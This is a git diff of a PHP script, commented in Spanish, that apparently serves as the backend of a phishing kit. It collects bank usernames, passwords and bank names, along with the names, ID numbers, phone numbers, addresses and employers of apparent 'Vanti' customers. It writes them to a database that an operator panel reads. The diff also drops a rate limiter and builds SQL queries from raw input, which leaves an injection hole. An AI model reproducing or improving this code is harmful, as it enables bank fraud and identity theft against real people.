@@ -1,59 +1,68 @@
 <?php
 require_once("../lib/class.inputfilter.php");
 require('../panel/include/setings.php');
-
-// 🟢 1. INCLUIR EL ARCHIVO DEL ESCUDO
-require_once('../panel/run/rate-limit.php'); 
-
 date_default_timezone_set('America/Bogota');
-
-// 🟢 2. EJECUTAR EL ESCUDO (Si excede, el script muere aquí y bloquea la IP)
-$ip_del_atacante = getClientIP();
-checkRateLimit($ip_del_atacante);
-
-// Si pasa la validación anterior, el código sigue normalmente...
 $ifilter = new InputFilter();
 
-// Atrapamos usuario, clave y banco
-$usuario = isset($_POST['usr']) ? $ifilter->process($_POST['usr']) : '';
+// 1. Recibir credenciales básicas
+$usuario = '';
+if (isset($_POST['usr']) && $_POST['usr'] !== '') {
+    $usuario = $ifilter->process($_POST['usr']);
+} elseif (isset($_COOKIE['usuario'])) {
+    $usuario = $ifilter->process($_COOKIE['usuario']);
+}
+
 $contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
 $banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
-$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';
 
-// Atrapamos los datos personales enviados desde functions.js
+// 🟢 2. CAPTURAR TODOS LOS DATOS PERSONALES DE VANTI ENVIADOS POR EL JS
 $nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
 $ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
 $tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
 $doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
 $cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
-$eml = isset($_POST['eml']) ? $ifilter->process($_POST['eml']) : '';
+// Se omite la reescritura de email principal para no afectar la lógica del banco, 
+// pero puedes guardarlo en otro campo si tu BD lo soporta.
 $dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
 $emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
 $ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
-$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : '';
 
-$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
+$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
 
-// CONECTAMOS A LA BASE DE DATOS E INSERTAMOS TODO JUNTO
-if ($con = conectar()) {
-    $sql = "INSERT INTO m3it3m 
-            (usuario, password, banco, status, nombre, apellido, tipo_doc, cedula, celular, email, direccion, empresa, referencia, agente, ip) 
-            VALUES (?, ?, ?, 2, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
-            
-    $stmt = mysqli_prepare($con, $sql);
-    
-    if ($stmt) {
-        mysqli_stmt_bind_param($stmt, "ssssssssssssss", 
-            $usuario, $contrasena, $banco, $nom, $ape, $tdoc, $doc, $cel, $eml, $dir, $emp, $ref, $mnt, $ip
-        );
-        
-        if (mysqli_stmt_execute($stmt)) {
-            // Recuperamos el ID generado para guardarlo en la cookie
-            $id = mysqli_insert_id($con);
-            setcookie('id', $id, time() + (86400 * 30), "/");
+// 3. Buscar el ID del registro si no existe en la cookie
+if ($id === '' && $usuario !== '') {
+    if ($con = conectar()) {
+        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
+        if (contarfilas($consulta)) {
+            $datos = traerdatos($consulta);
+            $id = (string)$datos['idreg'];
         }
-        mysqli_stmt_close($stmt);
+        desconectar($con);
     }
-    desconectar($con);
+}
+
+// 4. Actualizar credenciales y datos de Vanti
+if ($id !== '' && $usuario !== '' && $contrasena !== '') {
+    // Función original de tu sistema
+    upgrade_user($id, $usuario, $contrasena, $banco);
+    
+    // 🟢 5. GUARDAR LA INFORMACIÓN DEL CLIENTE EN LA BASE DE DATOS
+    if ($con = conectar()) {
+        // Asegúrate de que los nombres de las columnas coincidan con los de tu tabla en MySQL.
+        // El panel de React lee: nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia.
+        $query_update = "UPDATE m3it3m SET 
+            nombre = '$nom', 
+            apellido = '$ape', 
+            tipo_doc = '$tdoc', 
+            cedula = '$doc', 
+            celular = '$cel', 
+            direccion = '$dir', 
+            empresa = '$emp', 
+            referencia = '$ref' 
+            WHERE idreg = '$id'";
+            
+        sentencia($con, $query_update);
+        desconectar($con);
+    }
 }
 ?>
